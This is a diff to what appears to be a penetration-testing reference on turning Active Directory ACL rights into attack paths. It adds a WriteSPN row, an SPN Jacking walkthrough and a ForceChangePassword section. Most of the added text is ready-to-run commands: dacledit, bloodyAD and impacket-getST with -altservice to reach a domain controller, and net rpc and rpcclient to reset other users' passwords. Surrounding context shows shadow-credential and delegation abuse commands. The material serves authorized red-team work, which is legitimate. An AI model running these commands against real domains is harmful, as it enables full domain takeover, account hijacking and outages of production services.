@@ -12,6 +12,7 @@ Turn graph-level ACL findings into confirmed, reproducible AD attack paths while
 | `WriteDacl` | Modify the object's DACL | Grant self `GenericAll`, then perform the intended action |
 | `WriteOwner` | Take ownership, then edit DACL | Owner takeover followed by privilege grant |
 | `GenericWrite` | Modify writable attributes | Shadow credentials, SPN write, logon script, delegation attributes |
+| `WriteSPN` | Validated Write to servicePrincipalName | SPN Jacking (redirect KCD targets), targeted Kerberoasting |
 | `ForceChangePassword` | Reset a user's password | Immediate credential takeover if target account is valuable |
 | `AddMember` | Add a principal to a group | Privilege escalation through group membership |
 | `AllExtendedRights` | Includes sensitive extended operations | Password reset, replication-adjacent paths depending target |
@@ -94,6 +95,7 @@ Common paths:
 - User object: add an SPN and Kerberoast the account (targeted Kerberoasting).
 - User object: configure shadow credentials (`msDS-KeyCredentialLink`) when AD CS and PKINIT are usable.
 - Computer object: configure resource-based constrained delegation when machine-account quota and delegation settings allow it.
+- Computer object: modify `servicePrincipalName` for SPN Jacking (see below).
 - GPO object: modify linked policy only in explicitly authorized scope.
 
 ```powershell
@@ -110,6 +112,60 @@ certipy shadow auto -u attacker@domain.local -p pass -account <target_user> -dc-
 impacket-addcomputer domain.local/user:pass -computer-name 'EVIL$' -computer-pass 'P@ss123!'
 impacket-rbcd -delegate-from 'EVIL$' -delegate-to '<target_computer>$' -dc-ip <dc_ip> -action write 'domain.local/user:pass'
 impacket-getST -spn cifs/<target_computer> -impersonate Administrator -dc-ip <dc_ip> 'domain.local/EVIL$:P@ss123!'
+```
+
+### `WriteSPN` (Validated Write to servicePrincipalName)
+
+Separate from GenericWrite: the "Validated Write to servicePrincipalName" permission is a specific property right that allows modifying SPNs without full GenericWrite. Often granted to helpdesk groups, server operators, or via delegation on OUs containing computer objects.
+
+**SPN Jacking attack** — when combined with a Constrained Delegation account:
+
+1. Account A has `msDS-AllowedToDelegateTo: HTTP/TARGET.domain.local`
+2. `HTTP/TARGET.domain.local` is currently registered on MACHINE_X$
+3. Attacker has WriteSPN on MACHINE_X$ AND on a higher-value target (e.g., DC01$)
+4. Move the SPN: remove from MACHINE_X$, add to DC01$
+5. KDC now resolves `HTTP/TARGET.domain.local` → DC01$ → encrypts S4U2Proxy TGS with DC01$ key
+6. Use `-altservice CIFS/DC01.domain.local` → full access on DC
+
+```bash
+# Enumerate WriteSPN rights (dacledit or bloodhound)
+dacledit.py -target 'MACHINE_X$' domain.local/user:pass -dc-ip <dc_ip> -action read | grep -i spn
+# Look for: WriteProperty on servicePrincipalName, or ValidatedWrite, or GenericWrite
+
+# Remove SPN from source
+bloodyAD -u attacker -p pass -d domain.local --host <dc_ip> \
+  set object 'MACHINE_X$' servicePrincipalName -v 'HTTP/TARGET.domain.local' --remove
+
+# Add SPN to high-value target
+bloodyAD -u attacker -p pass -d domain.local --host <dc_ip> \
+  set object 'DC01$' servicePrincipalName -v 'HTTP/TARGET.domain.local' --append
+
+# S4U2Proxy with altservice → domain compromise
+impacket-getST -spn HTTP/TARGET.domain.local -impersonate administrator \
+  -altservice CIFS/DC01.domain.local domain.local/svc_kcd:pass -dc-ip <dc_ip>
+```
+
+**Constraints**:
+- AD enforces SPN uniqueness per forest — must REMOVE before ADD (otherwise `constraintViolation`)
+- If target SPN is in use by a production service, removing it breaks that service (noise)
+- Works best when the delegation target SPN is on a low-value or inactive machine
+
+→ Full SPN Jacking technique details: `references/kerberos-attacks.md` §SPN Jacking.
+
+### `ForceChangePassword` on user
+
+Immediate credential takeover. Particularly impactful when:
+- Target user has Constrained Delegation configured
+- Target user is in a privileged group or has further ACL paths
+- Combined with SPN Jacking: reset password of KCD account → control the delegation
+
+```bash
+# Linux
+net rpc password '<target_user>' 'NewPass123!' -U 'domain.local/attacker%pass' -S <dc_ip>
+# Or: bloodyAD
+bloodyAD -u attacker -p pass -d domain.local --host <dc_ip> set password '<target_user>' 'NewPass123!'
+# Or: rpcclient
+rpcclient -U 'domain.local/attacker%pass' <dc_ip> -c "setuserinfo2 <target_user> 23 'NewPass123!'"
 ```
 
 ## Attack path selection
